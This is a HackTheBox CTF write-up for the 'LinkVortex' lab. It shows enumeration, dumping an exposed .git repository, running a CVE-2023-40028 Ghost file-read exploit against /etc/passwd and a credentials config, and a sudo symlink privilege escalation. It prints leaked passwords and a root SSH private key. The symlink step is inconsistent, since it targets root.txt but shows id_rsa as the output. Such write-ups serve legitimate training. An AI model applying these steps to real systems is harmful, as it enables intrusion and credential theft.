---
title: LinkVortex Lab HackTheBox
date: 09-02-2025
layout: post
categories:
  - Hack The Box
tags:
  - blog
  - ctf
  - easy
  - hackthebox
  - linux
image: 
    path: /assets/img/sample/linkvortex/LinkVortexT.jpg
    alt: LinkVortex Lab HackTheBox
---




## Introdution

- The LinkVortex machine provided an engaging challenge involving enumeration, exploiting vulnerabilities, and privilege escalation. In this blog post, I’ll walk you through my process for rooting the machine.
- First I add IP of The LinkVortex Lab into file `/etc/hosts` in my virtual machine.

## Reconnaissance
~~~ shell
sudo su 
~~~
{:.nolineno}

~~~ shell 
echo "10.10.11.47    linkvortex.htb" | tee -a /etc/hosts"
~~~
{:.nolineno}

### Nmap Scan

At first, I used `nmap` to scan the ports.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ nmap -A 10.10.11.47
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 20:17 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: BitByBit Hardware
|_http-generator: Ghost 5.58
|_http-server-header: Apache
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   144.35 ms 10.10.14.1
2   144.40 ms linkvortex.htb (10.10.11.47)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
~~~

### Fuzz web application with fuff

I saw machine with port 80 running a web server so I proceeded exploit it using tool `ffuf`.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ ffuf -u http://linkvortex.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0 -t 100


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

                        [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 305ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 97ms]
favicon.ico             [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 162ms]
LICENSE                 [Status: 200, Size: 1065, Words: 149, Lines: 23, Duration: 148ms]
robots.txt              [Status: 200, Size: 121, Words: 7, Lines: 7, Duration: 80ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 53ms]
sitemap.xml             [Status: 200, Size: 527, Words: 6, Lines: 1, Duration: 88ms]
:: Progress: [4614/4614] :: Job [1/1] :: 968 req/sec :: Duration: [0:00:05] :: Errors: 0 ::


http://linkvortex.htb/robots.txt

User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
~~~

I try access `http://linkvortex.htb/ghost` and discovered the *admin page*, but I don't have any credentials. I try to enumerate subdomains.

### Fuzz subdomains with fuff

I used tool 'ffuf` to fuzz subdomains.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ ffuf -u http://linkvortex.htb/ -w /usr/share/wordlists/dirb/common.txt -H "HOST:FUZZ.linkvortex.htb" -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 49ms]
:: Progress: [4614/4614] :: Job [1/1] :: 760 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
~~~

I found a subdomain called *dev*, then I added subdomain `dev.linkvortex.htb` to the file `etc/hosts`. I used shell command.

~~~ shell
sudo su 
~~~
{:.nolineno}

~~~ shell 
echo "10.10.11.47    dev.linkvortex.htb" | tee -a /etc/hosts"
~~~
{:.nolineno}

### Directory Fuzzing with ffuf 

I proceed to use the technique [Directory Fuzzing](https://thehacker.recipes/web/recon/directory-fuzzing) to discover domain `http://dev.linkvortex.htb`.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0 -t 100


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 51ms]
.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 57ms]
.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 57ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 59ms]
                        [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 60ms]
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 50ms]
index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 50ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 45ms]
:: Progress: [4614/4614] :: Job [1/1] :: 2083 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
~~~

## Exploitation

I used tool [git-dumper](https://github.com/arthaud/git-dumper) to extract all data.
You can install it to your attack machine using shell:
~~~ shell
pip install git-dumper
~~~ 
{:.nolineno}

~~~ shell
git-dumper http://dev.linkvortex.htb/.git/ .
~~~
{:.nolineno}

I found credential

~~~ shell
┌──(trit㉿chimp)-[~/…/test/regression/api/admin]
└─$ cat authentication.test.js | grep "password"
            const password = 'OctopiFociPilfer45';
                        password,
            await agent.loginAs(email, password);
                        password: 'thisissupersafe',
                        password: 'thisissupersafe',
            const password = 'thisissupersafe';
                        password,
            await cleanAgent.loginAs(email, password);
                        password: 'lel123456',
                        password: '12345678910',
                        password: '12345678910',
        it('reset password', async function () {
                password: ownerUser.get('password')
            await agent.put('authentication/password_reset')
                    password_reset: [{
        it('reset password: invalid token', async function () {
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: expired token', async function () {
                password: ownerUser.get('password')
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: unmatched token', async function () {
                password: 'invalid_password'
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: generate reset token', async function () {
                .post('authentication/password_reset')
                    password_reset: [{
    describe('Reset all passwords', function () {
        it('reset all passwords returns 204', async function () {
            await agent.post('authentication/global_password_reset')
~~~

~~~
username: admin@linkvortex.htb
password: OctopiFociPilfer45
~~~

I logged `dev.linkvortex.htb` and found a vulnerability on this server.

![vulnerability](/assets/img/sample/linkvortex/vulnerability.png)

I dowloaded the exploit file [CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028) on Kali Linux attack machine.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ chmod +x CVE-2023-40028.sh

┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ ./CVE-2023-40028.sh  -u admin@linkvortex.htb  -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
~~~

Now we can read files from the machine, we will try reading the `config.production.json` file we found in the `Dockerfile.ghost`.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ ./CVE-2023-40028.sh  -u admin@linkvortex.htb  -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
~~~


Tries connect to ssh server with credentials `bob@linkvortex.htb/fibber-talented-worthand` and it works.


~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ ssh bob@linkvortex.htb
The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Feb  8 18:42:49 2025 from 10.10.14.100
bob@linkvortex:~$ ls
exploit.txt  hyh.txt  hyh1.txt  id_rsa  linpeas_linux_amd64  test.txt  test1.txt  test2.txt  user.txt
bob@linkvortex:~$ cat user.txt
3fb364f565*****b1ec3a27390ceaee7
~~~

## Privilege Escalation

~~~ shell
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png



bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
~~~


Create a symbolic link pointing to `/root/root.txt`.

~~~ shell 
ln -s /root/root.txt exploit.txt
~~~

Since we need `.png` file for exploitation so we will create a link exploit.png pointing to exploit.txt.

~~~ shell 
ln -s /home/bob/exploit.txt exploit.png
~~~

Exploit the environment variable injection to ensure the file content is printed.

~~~ shell 
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh exploit.png
~~~

We will see the output as `id_rsa`.

~~~
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
~~~

Copy content *id_rsa in ssh server* __to__ *id_rsa file of attack machine*, grant read and write permission to owner and get root flag.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ nano id_rsa

┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ chmod 600 id_rsa

┌──(trit㉿chimp)-[~/HackTheBox/LinkVortex]
└─$ ssh -i id_rsa root@10.10.11.47
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Feb  9 11:25:43 2025 from 10.10.14.45
root@linkvortex:~# ls
root.txt
root@linkvortex:~# cat root.txt
4b2f5b68b1*****6bec0fffa
~~~

**Thank for watching!**